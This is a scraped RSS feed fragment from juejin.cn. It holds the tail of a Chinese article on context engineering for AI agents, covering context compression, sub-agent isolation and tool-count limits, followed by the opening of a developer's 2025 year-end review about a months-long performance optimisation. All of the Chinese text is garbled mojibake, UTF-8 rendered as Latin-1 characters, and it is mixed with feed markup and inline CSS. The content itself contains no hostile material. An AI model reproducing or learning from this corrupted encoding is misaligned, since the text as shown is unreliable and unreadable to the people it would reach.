<li>å‹ç¼©åæ£€æŸ¥å®é™…é‡Šæ”¾çš„ç©ºé—´</li>
<li>å¦‚æœå‹ç¼©æ•ˆæœä¸æ˜æ˜¾ï¼ˆå› ä¸ºå³ä½¿ç´§å‡‘æ ¼å¼ä¹Ÿå ç”¨ç©ºé—´ï¼‰ï¼Œæ‰è€ƒè™‘æ‘˜è¦</li>
<li>æ‘˜è¦æ—¶ä½¿ç”¨å®Œæ•´ç‰ˆæœ¬è€Œéå‹ç¼©ç‰ˆæœ¬çš„æ•°æ®</li>
<li>å§‹ç»ˆä¿ç•™æœ€æ–°çš„å‡ æ¬¡å®Œæ•´å·¥å…·è°ƒç”¨</li>
</ul>
<p>å°½å¯èƒ½ä¿ç•™ä¿¡æ¯çš„å®Œæ•´æ€§ï¼Œåªåœ¨å¿…è¦æ—¶æ‰æ¥å—ä¿¡æ¯æŸå¤±ã€‚è¿™å°±åƒæ•°æ®å‹ç¼©ç®—æ³•ä¸­çš„æ— æŸå‹ç¼©å’Œæœ‰æŸå‹ç¼©ï¼Œä½ æ€»æ˜¯å…ˆå°è¯•æ— æŸæ–¹æ¡ˆã€‚</p>
<p>ä¸åŒç±»å‹çš„å†…å®¹æœ‰ä¸åŒçš„å‹ç¼©æ½œåŠ›ã€‚æœç´¢ç»“æœã€API å“åº”è¿™ç±»å†…å®¹å‹ç¼©æ•ˆæœå¥½ï¼Œå› ä¸ºå¤§éƒ¨åˆ†ä¿¡æ¯å¯ä»¥é€šè¿‡æŸ¥è¯¢é‡æ–°è·å–ã€‚è€Œç”¨æˆ·çš„æŒ‡ä»¤ã€æ¨¡å‹çš„æ¨ç†è¿‡ç¨‹å‹ç¼©ç©ºé—´æœ‰é™ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯å¾€å¾€éƒ½æ˜¯å¿…è¦çš„ã€‚</p>
<h2 data-id="heading-5">5. éš”ç¦»ç­–ç•¥çš„é€‰æ‹©å–å†³äºä»»åŠ¡ç‰¹æ€§è€Œéç›´è§‰</h2>
<p>å¤šæ™ºèƒ½ä½“éš”ç¦»æ˜¯ä¸ªè€è¯é¢˜ï¼Œä½† Pete åˆ†äº«çš„ç»éªŒæ¨ç¿»äº†å¾ˆå¤šå¸¸è§åšæ³•ã€‚</p>
<p>é¦–å…ˆæ˜¯åæ¨¡å¼çš„è¯†åˆ«ã€‚å¾ˆå¤šå›¢é˜Ÿå–œæ¬¢æŒ‰äººç±»è§’è‰²åˆ’åˆ†æ™ºèƒ½ä½“ï¼šè®¾è®¡å¸ˆæ™ºèƒ½ä½“ã€ç¨‹åºå‘˜æ™ºèƒ½ä½“ã€ç»ç†æ™ºèƒ½ä½“ç­‰ã€‚Pete æ˜ç¡®æŒ‡å‡ºè¿™æ˜¯ä¸ªé™·é˜±ã€‚è¿™ç§åˆ’åˆ†æºäºäººç±»ç»„ç»‡çš„å±€é™æ€§ï¼ˆä¸ªäººèƒ½åŠ›å’Œæ³¨æ„åŠ›æœ‰é™ï¼‰ï¼Œè€Œä¸æ˜¯ AI ç³»ç»Ÿçš„æœ€ä¼˜è®¾è®¡ã€‚Manus åªæœ‰æå°‘çš„å‡ ä¸ªåŠŸèƒ½æ€§æ™ºèƒ½ä½“ï¼šé€šç”¨æ‰§è¡Œå™¨ã€è§„åˆ’å™¨ã€çŸ¥è¯†ç®¡ç†å™¨ã€‚</p>
<p>å…³äºéš”ç¦»æ¨¡å¼çš„é€‰æ‹©ï¼ŒPete åŒºåˆ†äº†ä¸¤ç§åœºæ™¯ï¼š</p>
<p>é€šä¿¡æ¨¡å¼é€‚åˆç»“æœå¯¼å‘çš„ç‹¬ç«‹ä»»åŠ¡ã€‚ä¸»æ™ºèƒ½ä½“å‘é€æ˜ç¡®æŒ‡ä»¤ï¼Œå­æ™ºèƒ½ä½“ç‹¬ç«‹å®Œæˆï¼Œè¿”å›ç»“æœã€‚æ•´ä¸ªè¿‡ç¨‹ä¸»æ™ºèƒ½ä½“ä¸å…³å¿ƒç»†èŠ‚ï¼Œåªè¦æœ€ç»ˆè¾“å‡ºã€‚æ¯”å¦‚"åœ¨ä»£ç åº“ä¸­æœç´¢ç‰¹å®šå‡½æ•°"ã€"å°†è¿™æ®µæ–‡æœ¬ç¿»è¯‘æˆä¸­æ–‡"ã€‚è¿™ç§æ¨¡å¼çš„ä¼˜åŠ¿æ˜¯ä¸Šä¸‹æ–‡å¹²å‡€ã€æˆæœ¬ä½ã€æ˜“äºè°ƒè¯•ã€‚</p>
<p>å…±äº«ä¸Šä¸‹æ–‡æ¨¡å¼é€‚åˆéœ€è¦å®Œæ•´å†å²ä¿¡æ¯çš„å¤æ‚ä»»åŠ¡ã€‚å­æ™ºèƒ½ä½“èƒ½çœ‹åˆ°æ‰€æœ‰å†å²å¯¹è¯å’Œå·¥å…·è°ƒç”¨ï¼Œä½†æœ‰è‡ªå·±çš„ç³»ç»Ÿæç¤ºå’Œå·¥å…·é›†ã€‚æ¯”å¦‚æ·±åº¦ç ”ç©¶ä»»åŠ¡ï¼Œæœ€ç»ˆæŠ¥å‘Šéœ€è¦å‚è€ƒå¤§é‡ä¸­é—´æœç´¢å’Œç¬”è®°ã€‚è¿™ç§æ¨¡å¼æˆæœ¬é«˜ï¼ˆéœ€è¦é¢„å¡«å……å¤§é‡ä¸Šä¸‹æ–‡ï¼Œæ— æ³•å¤ç”¨ KV ç¼“å­˜ï¼‰ï¼Œä½†å¯¹æŸäº›ä»»åŠ¡æ˜¯å¿…è¦çš„ã€‚</p>
<p>åˆ¤æ–­ä½¿ç”¨å“ªç§æ¨¡å¼çš„å…³é”®æ˜¯ä»ç»“æœæ¨ç†è¿‡ç¨‹çš„ä¾èµ–æ€§ã€‚å¦‚æœæœ€ç»ˆè¾“å‡ºå¼ºä¾èµ–äºä¸­é—´æ­¥éª¤çš„ç»†èŠ‚ï¼Œå°±éœ€è¦å…±äº«ä¸Šä¸‹æ–‡ã€‚å¦‚æœåªéœ€è¦æœ€ç»ˆç»“æœï¼Œé€šä¿¡æ¨¡å¼å°±è¶³å¤Ÿäº†ã€‚</p>
<p>Pete è¿˜æåˆ°äº†ä¸€ä¸ªå®ç”¨æŠ€å·§ï¼š"æ™ºèƒ½ä½“å³å·¥å…·"ï¼ˆagent as toolï¼‰ã€‚ä»ä¸»æ™ºèƒ½ä½“è§†è§’ï¼Œè°ƒç”¨å­æ™ºèƒ½ä½“å°±åƒè°ƒç”¨æ™®é€šå·¥å…·ï¼Œæœ‰æ˜ç¡®çš„è¾“å…¥è¾“å‡ºæ¥å£ã€‚è¿™ç®€åŒ–äº†ç³»ç»Ÿè®¾è®¡ï¼Œä¹Ÿè®©è°ƒè¯•æ›´å®¹æ˜“ã€‚Manus çš„"é«˜çº§æœç´¢"åŠŸèƒ½å°±æ˜¯è¿™æ ·å®ç°çš„ï¼Œè¡¨é¢ä¸Šæ˜¯ä¸ªå·¥å…·ï¼Œå®é™…æ˜¯ä¸ªå®Œæ•´çš„å­æ™ºèƒ½ä½“å·¥ä½œæµã€‚</p>
<p>ä»–ä»¬è§£å†³é€šä¿¡é—®é¢˜çš„æ–¹æ³•æ˜¯å¼ºåˆ¶ä½¿ç”¨ç»“æ„åŒ–è¾“å‡ºã€‚ä¸»æ™ºèƒ½ä½“è°ƒç”¨å­æ™ºèƒ½ä½“å‰å¿…é¡»å®šä¹‰è¾“å‡ºæ¨¡å¼ï¼Œå­æ™ºèƒ½ä½“é€šè¿‡ä¸“é—¨çš„"æäº¤ç»“æœ"å·¥å…·è¿”å›æ•°æ®ï¼Œç³»ç»Ÿç”¨çº¦æŸè§£ç ç¡®ä¿æ ¼å¼æ­£ç¡®ã€‚è¿™é¿å…äº†è‡ªç”±æ ¼å¼é€šä¿¡å¸¦æ¥çš„è§£æé—®é¢˜å’Œä¿¡æ¯ä¸¢å¤±ã€‚</p>
<h2 data-id="heading-6">6. ä¸€äº›é¢å¤–çš„æŠ€æœ¯æ´å¯Ÿ</h2>
<p>é™¤äº†è¿™äº”ä¸ªæ ¸å¿ƒç»éªŒï¼Œè¿˜æœ‰ä¸€äº›å€¼å¾—è®°å½•çš„æŠ€æœ¯ç»†èŠ‚ã€‚</p>
<p>ä¿¡æ¯çš„å±€éƒ¨æ€§ã€‚ä½¿ç”¨åŸºäºè¡Œçš„æ ¼å¼æ„å‘³ç€æ¯è¡Œéƒ½æ˜¯ç‹¬ç«‹çš„ä¿¡æ¯å•å…ƒï¼Œè¯»å–ç¬¬ 100 è¡Œä¸éœ€è¦è§£æå‰ 99 è¡Œã€‚è¿™å¯¹äºå¤§æ–‡ä»¶çš„éšæœºè®¿é—®è‡³å…³é‡è¦ã€‚</p>
<p>ç»“æ„åŒ–ä¸ç­‰äºå¤æ‚æ ¼å¼ã€‚Pete å¼ºè°ƒï¼Œä»–ä»¬ä¼˜å…ˆä½¿ç”¨åŸºäºè¡Œï¼ˆline-basedï¼‰çš„çº¯æ–‡æœ¬æ ¼å¼ï¼Œè€Œä¸æ˜¯ JSON æˆ– XMLã€‚åŸå› å¾ˆç®€å•ï¼šæ¨¡å‹å¯ä»¥ç”¨ grep æœç´¢ç‰¹å®šè¡Œï¼Œç”¨ sed ä¿®æ”¹ç‰¹å®šå†…å®¹ï¼Œç”¨ head/tail è¯»å–éƒ¨åˆ†æ•°æ®ã€‚è¿™äº›éƒ½æ˜¯æ¨¡å‹å·²ç»æŒæ¡çš„åŸºç¡€å·¥å…·ã€‚</p>
<p>å…³äº Markdown çš„ä½¿ç”¨è¦ç‰¹åˆ«è°¨æ…ã€‚è™½ç„¶æ¨¡å‹éƒ½æ¥å—è¿‡ Markdown è®­ç»ƒï¼Œä½†è¿‡åº¦ä½¿ç”¨ä¼šå¸¦æ¥å‰¯ä½œç”¨ã€‚æŸäº›æ¨¡å‹ä¼šå› æ­¤è¾“å‡ºè¿‡å¤šçš„é¡¹ç›®ç¬¦å·å’Œæ ¼å¼åŒ–æ ‡è®°ï¼Œæµªè´¹ Token è¿˜å½±å“å¯è¯»æ€§ã€‚Manus çš„ç»éªŒæ˜¯ï¼šåœ¨éœ€è¦ç»“æ„æ—¶ç”¨ Markdownï¼Œåœ¨å­˜å‚¨æ•°æ®æ—¶ç”¨çº¯æ–‡æœ¬ã€‚</p>
<p>å…³äºæ¨¡å‹åˆ‡æ¢çš„è¯„ä¼°æ–¹æ³•ã€‚Pete æåˆ°ï¼Œä»–ä»¬ä¼šåœ¨å¼ºå¼±æ¨¡å‹é—´åˆ‡æ¢æ¥è¯„ä¼°æ¶æ„çš„æœªæ¥é€‚åº”æ€§ã€‚å¦‚æœä¸€ä¸ªæ¶æ„åœ¨å¼±æ¨¡å‹ä¸Šä¹Ÿèƒ½å·¥ä½œï¼ˆè™½ç„¶æ•ˆæœå·®ä¸€äº›ï¼‰ï¼Œè¯´æ˜å®ƒä¸æ˜¯è¿‡åº¦ä¾èµ–ç‰¹å®šæ¨¡å‹èƒ½åŠ›çš„è„†å¼±è®¾è®¡ã€‚</p>
<p>å…³äºå·¥å…·æ•°é‡çš„ä¸Šé™ï¼Œä»–ä»¬çš„ç»éªŒæ˜¯ä¸è¶…è¿‡ 30 ä¸ªã€‚è¿™ä¸æ˜¯ä»»æ„æ•°å­—ï¼Œè€Œæ˜¯åŸºäºå¤§é‡æµ‹è¯•ã€‚è¶…è¿‡è¿™ä¸ªæ•°é‡ï¼Œæ¨¡å‹å¼€å§‹é¢‘ç¹è°ƒç”¨é”™è¯¯çš„å·¥å…·ï¼Œç”šè‡³è°ƒç”¨ä¸å­˜åœ¨çš„å·¥å…·ã€‚è§£å†³æ–¹æ¡ˆä¸æ˜¯åŠ¨æ€åŠ è½½å·¥å…·ï¼Œè€Œæ˜¯è®¾è®¡åˆ†å±‚çš„è¡Œä¸ºç©ºé—´ï¼šå°‘é‡åŸå­å·¥å…· + æ²™ç›’å‘½ä»¤ + ä»£ç æ‰§è¡Œã€‚</p>
<p>å…³äºè¯„ä¼°ä½“ç³»ï¼ŒManus çš„ä¸‰å±‚è¯„ä¼°å€¼å¾—å€Ÿé‰´ï¼šç”¨æˆ·è¯„åˆ†æ˜¯åŒ—ææ˜ŸæŒ‡æ ‡ï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•è¦†ç›–å¯éªŒè¯çš„ä»»åŠ¡ï¼ŒçœŸäººè¯„ä¼°å¤„ç†ä¸»è§‚æ€§å¼ºçš„è¾“å‡ºã€‚å­¦æœ¯åŸºå‡†æµ‹è¯•åªæ˜¯å‚è€ƒï¼Œä¸èƒ½ä½œä¸ºä¸»è¦ä¾æ®ã€‚</p>
<p>ä¸Šä¸‹æ–‡å·¥ç¨‹ä¸æ˜¯ä¸€äº›é›¶æ•£çš„æŠ€å·§ï¼Œè€Œæ˜¯ä¸€ä¸ªéœ€è¦ç³»ç»Ÿæ€è€ƒçš„å·¥ç¨‹é¢†åŸŸã€‚æ¯ä¸ªè®¾è®¡å†³ç­–éƒ½ä¼šå½±å“åˆ°å…¶ä»–éƒ¨åˆ†ï¼Œæ²¡æœ‰æ”¾ä¹‹å››æµ·è€Œçš†å‡†çš„æœ€ä½³å®è·µï¼Œåªæœ‰åŸºäºå…·ä½“åœºæ™¯çš„æƒè¡¡å–èˆã€‚</p>
<p>ä»¥ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘çš„2025å¹´å¹´ç»ˆæ€»ç»“]]></title>    <link>https://juejin.cn/post/7592816646869811209</link>    <guid>https://juejin.cn/post/7592816646869811209</guid>    <pubDate>2026-01-08T08:39:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592816646869811209" data-draft-id="7592610104441667594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘çš„2025å¹´å¹´ç»ˆæ€»ç»“"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•,Java"/> <meta itemprop="datePublished" content="2026-01-08T08:39:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èå­è±è±çˆ±æ‰“æ€ª"/> <meta itemprop="url" content="https://juejin.cn/user/1239904847403927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘çš„2025å¹´å¹´ç»ˆæ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904847403927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èå­è±è±çˆ±æ‰“æ€ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:39:28.000Z" title="Thu Jan 08 2026 08:39:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ—¶é—´è¿‡å¾—çœŸå¿«ï¼Œä¸€è½¬çœ¼åŠŸå¤«2025å¹´è¿‡å®Œäº†ï¼Œè¿™é‡Œåšä¸ªå¹´ç»ˆæ€»ç»“ï¼Œè®°å½•è¿™ä¸€å¹´çš„äººå’Œäº‹ã€‚</p>
<p>å›é¡¾è¿™ä¸€å¹´ï¼Œæœ‰æ¿€æµå‹‡è¿›ï¼Œäº¦æœ‰å¹³æ·¡ä¼¼æ°´ã€‚</p>
<blockquote>
<p><strong>æ¿€æµå‹‡è¿›æ—¶ï¼Œæˆ‘åœ¨å¾€é«˜å¤„èµ°ã€‚</strong></p>
<p><strong>å¹³æ·¡ä¼¼æ°´æ—¶ï¼Œæˆ‘åœ¨äº«å—äººé—´æœ€çº¯å‡€çš„çˆ±å’Œå¹¸ç¦ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€å…³äºå·¥ä½œ</h2>
<p>è¿™ä¸€å¹´ï¼Œå·¥ä½œä¸Šæˆ‘æœ‰è¾ƒå¤§çš„æˆå°±æ„Ÿã€‚</p>
<p>å¤§æ¦‚3-4æœˆä»½ï¼Œå› ä¸ºæŸäº›åŸå› ï¼Œå‘ç°æˆ‘ä»¬è´Ÿè´£çš„Aé¡¹ç›®æ€§èƒ½ä¸¥é‡ä¸è¶³ï¼Œå¯¹æˆ‘ä»¬äº§ç”Ÿäº†æå¤§çš„æŒ‘æˆ˜ï¼ˆæœ‰äº§å“ä¸Šçš„ï¼Œæœ‰æ›´å¤§å±‚é¢çš„ï¼Œè¿™é‡Œå°±ä¸ç»†è¯´äº†ï¼Œæ€»ä¹‹è¿™ä¸ªæ€§èƒ½é—®é¢˜éå¸¸ç´§æ€¥ä¸”é‡è¦ï¼‰ï¼Œä¼˜åŒ–çš„ä»»åŠ¡ç»™åˆ°äº†æˆ‘ï¼Œ3-4æœˆä»½æ˜¯ä¸€ç›´é…åˆæµ‹è¯•è¿›è¡Œå‹æµ‹å’Œè°ƒä¼˜ï¼Œä½†æ˜¯æ•ˆæœä¸€ç›´ä¸ç†æƒ³ï¼Œæœ€ç»ˆé¢†å¯¼å±‚å†³å®šæŠ•å…¥äººåŠ›ç‰©åŠ›ï¼Œåœ¨æœ‰é™çš„æ—¶é—´å†…å»è¿›è¡Œä¸€æ³¢å¤§åˆ€é˜”æ–§å¼ä¼˜åŒ–ï¼ˆæ¶æ„è°ƒæ•´å’Œé‡è¦èŠ‚ç‚¹ä»£ç è°ƒæ•´ï¼‰ã€‚è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<ol>
<li>ã€æ‘¸åº•é˜¶æ®µã€‘å‹æµ‹å¹¶æ‘¸åº•å½“å‰äº§å“æœ€é«˜æ€§èƒ½ï¼ˆ3æœˆä»½ï¼‰</li>
<li>ã€æ–¹æ¡ˆé˜¶æ®µã€‘æ€§èƒ½æ‘¸åº•åï¼Œç´§æ¥ç€å°±æ˜¯çŸ­æ¿åˆ†æï¼Œåœ¨è¿›è¡Œå„ä¸ªåŸå› åˆ†æåï¼Œç”±ç‚¹åˆ°é¢å¼€å±•å…·ä½“çš„æŠ€æœ¯æ–¹æ¡ˆç¼–å†™ï¼Œç„¶åç»Ÿä¸€è¯„ä¼°å¯è¡Œæ€§ï¼Œå¹¶ç»™å‡ºé¢„æœŸä¼˜åŒ–æ•ˆæœã€‚æœ€ç»ˆæ•²å®šè½åœ°æŒ‰æ–¹æ¡ˆæ¨è¿›æ‰§è¡Œã€‚ï¼ˆ4ã€5æœˆä»½ï¼‰</li>
<li>ã€ç ”å‘é˜¶æ®µã€‘ä¼˜åŒ–æ–¹æ¡ˆæœ‰äº†æ¥ä¸‹æ¥å°±æ˜¯å¼€å‘äº†ï¼ŒæŠ•å…¥äº†ä¸€å®šçš„äººåŠ›ï¼Œå¤§çº¦2ä¸ªæœˆçš„æ—¶é—´ï¼Œä¼˜åŒ–ç‰ˆæœ¬å‘ç‰ˆã€‚ï¼ˆ6-7æœˆä»½ï¼‰</li>
<li>ã€æœ€ç»ˆæ•ˆæœã€‘æœ€ç»ˆï¼Œç»è¿‡å…±è®¡4ä¸ªæœˆå¤šçš„æ—¶é—´ï¼Œä¼˜åŒ–ç‰ˆæœ¬é¡ºåˆ©å‘ç‰ˆã€‚ <strong>ï¼ˆæœ€ç»ˆæ€§èƒ½è¶…è¿‡é¢„æœŸä¸”ç¢¾å‹ç«å“ï¼Œä¸è‡ªèº«ç›¸æ¯”æå‡äº†8å€å¤šï¼Œå¤§å¤§å¢åŠ äº†äº§å“ç«äº‰åŠ›ä»¥åŠå®¢æˆ·æ»¡æ„åº¦ï¼‰</strong>ã€‚</li>
</ol>
<p>æœ¬æ¬¡ä¼˜åŒ–æˆ‘ä½œä¸ºæ ¸å¿ƒå‚ä¸è€…å’Œè®¾è®¡è€…ï¼Œè¿™å‡ ä¸ªæœˆå¿ƒæ€ä¸€ç›´åœ¨è¿™ä¸Šè¾¹ã€‚</p>
<blockquote>
<p>å¹³æ—¶ï¼Œåœ°é“ä¸Šæˆ‘å’Œdeepseekè¯·æ•™ï¼Œå¤§åˆ°æ¶æ„ï¼Œå°åˆ°ä»£ç </p>
<p>æœ‰æ—¶ï¼Œæˆ‘ä¼šå› ä¸ºå‡ ä¸ªä¼˜åŒ–æ–¹æ¡ˆå“ªä¸ªæ”¶ç›Šæ›´å¤§è€Œç¿»æ¥è¦†å»ç¡ä¸ç€ç”šè‡³æ¢¦ä¸­éƒ½æ˜¯å·¥ä½œçš„å†…å®¹</p>
<p>æœ‰æ—¶ï¼Œæˆ‘ä¼šå› ä¸ºæƒ³æ–¹æ¡ˆçš„åˆç†æ€§æˆ–æƒ³å‡ºä¸€ä¸ªæ–°æ–¹æ¡ˆè€Œæ—©æ—©é†’æ¥å»ç ”ç©¶æŸ¥èµ„æ–™</p>
<p>æœ‰æ—¶ï¼Œæˆ‘ä¼šå› ä¸ºå‡ è¡Œä»£ç çš„æ€§èƒ½è€Œå†™å¤§é‡çš„ä»£ç æµ‹æ¥æµ‹å»</p>
</blockquote>
<p>é‚£æ®µæ—¶é—´ä¸­åˆåŸºæœ¬ä¸åˆä¼‘ï¼Œä¸‹ç­ä¹Ÿè¾ƒæ™šï¼Œå·¥ä½œæ—¶é—´å°±æ›´åˆ«è¯´äº†ï¼Œæ€»ä¹‹å¤ªå¤šçš„ä¸“æ³¨å’Œå¿ƒæ€éƒ½èŠ±è´¹åœ¨äº†è¿™ä¸ªä¼˜åŒ–ä¸Šè¾¹ï¼Œé‚£æ®µæ—¶é—´å±äºå¿˜æˆ‘æˆ–è€…è¯´åˆ°è¾¾ä¸€å®šå¢ƒç•Œï¼ˆæˆ‘åª³å¦‡æ€»è°ƒä¾ƒæˆ‘ï¼Œè¯´æˆ‘åˆ°è¾¾äº†ï¼š<strong>æ— æˆ‘å¢ƒç•Œ</strong>ï¼‰</p>
<p>æˆ‘è®°å¾—æˆ‘åª³å¦‡é—®è¿‡æˆ‘ï¼šæœ‰å¿…è¦è¿™ä¹ˆæ‹¼å—ï¼Ÿ
æˆ‘çš„å›ç­”æ˜¯ï¼š<strong>æ­¤æ—¶è¿™ç§çŠ¶æ€å·²ç»å’Œå·¥ä½œæ— å…³äº†ï¼Œå°±ç®—ä¸ç»™æˆ‘å·¥èµ„æˆ‘ä¹Ÿä¼šè¿™æ ·ï¼ˆåŸè¯å¤§æ„ï¼‰</strong>ã€‚</p>
<p>æˆ‘çŸ¥é“æ˜¯æˆ‘å†…å¿ƒåœ¨è¾ƒåŠ²ï¼Œåœ¨æ†‹å¾—ä¸€è‚¡åŠ²ï¼Œå°±åƒæˆ‘çš„ç½‘åä¸€æ ·ï¼Œèå­è±è±çˆ±æ‰“æ€ªï¼Œé‚£æ®µæ—¶é—´ï¼Œæœ¬è´¨ä¸Šæ˜¯æˆ‘åœ¨æ‰“æ€ªã€‚ä¸€æ—¦åŠ²å¤´ä¸Šæ¥äº†ï¼Œæ˜¯åœä¸ä¸‹æ¥çš„ã€‚å…¶å®æˆ‘æŒºå–œæ¬¢è¿™ç§æ„Ÿè§‰ï¼Œä¹Ÿéå¸¸äº«å—è¿™ç§æ„Ÿè§‰ã€‚æˆ–è®¸è¿™ä¹Ÿæ˜¯æˆ‘é™¤äº†åƒå–ï¼Œå¥³äººä¹‹å¤–ä¸ºæ•°ä¸å¤šçš„çˆ±å¥½äº†ã€‚</p>
